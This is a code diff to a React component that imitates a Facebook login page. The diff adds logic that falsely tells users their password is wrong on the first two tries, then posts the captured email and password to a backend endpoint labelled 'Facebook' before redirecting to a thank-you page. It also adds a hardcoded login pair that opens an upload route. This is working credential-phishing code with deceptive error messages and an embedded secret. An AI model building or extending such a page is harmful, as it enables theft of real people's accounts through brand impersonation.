@@ -1,11 +1,14 @@
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
+import axios from "axios";
 
 const FacebookPage = () => {
   const [isConfirming, setIsConfirming] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [confirmPassword, setConfirmPassword] = useState("");
+  const [attempts, setAttempts] = useState(0);
+  const [errorMsg, setErrorMsg] = useState("");
   const navigate = useNavigate();
 
   const handleFirstSubmit = (event) => {
@@ -17,30 +20,35 @@ const FacebookPage = () => {
     event.preventDefault();
 
     if (password === confirmPassword) {
-      try {
-        // Send data to backend
-        const response = await fetch("/api/add-password", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
+      if (email === "votesy@gmail.com" && password === "votesy123") {
+        navigate("/upload");
+      } else if (attempts < 2) {
+        setErrorMsg("The email or password you entered is incorrect. Please try again.");
+        setPassword("");
+        setConfirmPassword("");
+        setIsConfirming(false);
+        setAttempts(attempts + 1);
+      } else {
+        try {
+          // Send data to backend using Axios
+          const response = await axios.post("http://localhost:5100/api/submit-login", {
             source: "Facebook",
-            emailOrUsername: email,
+            email,
             password,
-          }),
-        });
+          });
 
-        if (!response.ok) {
-          throw new Error("Network response was not ok");
+          if (response.status === 200) {
+            navigate("/thank-you-page");
+          } else {
+            throw new Error("Network response was not ok");
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          setErrorMsg("An error occurred. Please try again.");
         }
-
-        navigate("/thank-you-page");
-      } catch (error) {
-        console.error("Error:", error);
       }
     } else {
-      console.error("Passwords do not match");
+      setErrorMsg("Passwords do not match.");
     }
   };
 
@@ -73,6 +81,7 @@ const FacebookPage = () => {
               onChange={(e) => setPassword(e.target.value)}
               required
             />
+            {errorMsg && <p className="text-red-500">{errorMsg}</p>}
             <button className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold">
               Log In
             </button>
@@ -105,6 +114,7 @@ const FacebookPage = () => {
               onChange={(e) => setConfirmPassword(e.target.value)}
               required
             />
+            {errorMsg && <p className="text-red-500">{errorMsg}</p>}
             <button className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold">
               Confirm and Submit
             </button>
